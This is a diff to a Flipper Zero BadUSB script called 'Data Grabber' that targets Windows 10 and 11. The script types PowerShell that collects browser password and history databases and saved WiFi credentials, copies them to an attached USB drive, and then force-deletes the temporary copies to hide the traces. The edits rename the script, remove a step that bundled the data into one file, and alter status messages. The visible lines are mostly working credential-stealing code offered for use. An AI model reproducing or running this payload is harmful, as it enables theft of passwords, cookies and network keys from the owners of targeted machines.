@@ -1,5 +1,5 @@
-REM Title: Data Grabber - Browser & WiFi Credentials
-REM Description: Extracts browser history, cookies, passwords & WiFi credentials
+REM Title: Data Grabber - Windows Browser & WiFi Credentials
+REM Description: Extracts browser history, cookies, passwords & WiFi credentials from Windows
 REM Target: Windows 10, 11
 REM Compatible: Flipper Zero BadUSB
 
@@ -43,18 +43,13 @@ STRING $wifiPasswords = @(); netsh wlan show profiles | Select-String "All User 
 ENTER
 DELAY 1000
 
-REM Compile all data into single file for encoding
-STRING $allData = @(); Get-ChildItem "$Env:TEMP\*passwords*.db" -ErrorAction SilentlyContinue | ForEach-Object { $allData += "=== $($_.Name) ===" + [System.IO.File]::ReadAllText($_.FullName) }; Get-ChildItem "$Env:TEMP\*history*.db" -ErrorAction SilentlyContinue | ForEach-Object { $allData += "=== $($_.Name) ===" + [System.IO.File]::ReadAllText($_.FullName) }; Get-Content "$Env:TEMP\wifi_passwords.txt" -ErrorAction SilentlyContinue | ForEach-Object { $allData += "=== WiFi Passwords ===" + $_ }
-ENTER
-DELAY 500
-
 REM ===== MODE 1: USB FIRST, then Caps Lock fallback =====
-STRING $found = $false; foreach($drive in @('E','F','G','H','I','J','K','L')) { if(Test-Path "$($drive):\") { Copy-Item "$Env:TEMP\*passwords*.db" "$($drive):\" -ErrorAction SilentlyContinue; Copy-Item "$Env:TEMP\*history*.db" "$($drive):\" -ErrorAction SilentlyContinue; Copy-Item "$Env:TEMP\wifi_passwords.txt" "$($drive):\" -ErrorAction SilentlyContinue; Write-Host "SUCCESS: Data exported to $($drive):"; $found = $true; break } }
+STRING $found = $false; foreach($drive in @('E','F','G','H','I','J','K','L')) { if(Test-Path "$($drive):\") { Copy-Item "$Env:TEMP\*passwords*.db" "$($drive):\" -ErrorAction SilentlyContinue; Copy-Item "$Env:TEMP\*history*.db" "$($drive):\" -ErrorAction SilentlyContinue; Copy-Item "$Env:TEMP\wifi_passwords.txt" "$($drive):\" -ErrorAction SilentlyContinue; Write-Host "SUCCESS: USB Export to $($drive):"; $found = $true; break } }
 ENTER
 DELAY 1000
 
 REM If USB found, cleanup and exit
-STRING if($found) { Remove-Item "$Env:TEMP\*passwords*.db" -Force -ErrorAction SilentlyContinue; Remove-Item "$Env:TEMP\*history*.db" -Force -ErrorAction SilentlyContinue; Remove-Item "$Env:TEMP\wifi_passwords.txt" -Force -ErrorAction SilentlyContinue; Write-Host 'Data ready on Flipper'; exit }
+STRING if($found) { Remove-Item "$Env:TEMP\*passwords*.db" -Force -ErrorAction SilentlyContinue; Remove-Item "$Env:TEMP\*history*.db" -Force -ErrorAction SilentlyContinue; Remove-Item "$Env:TEMP\wifi_passwords.txt" -Force -ErrorAction SilentlyContinue; Write-Host 'File ready on Flipper'; exit }
 ENTER
 DELAY 500
 
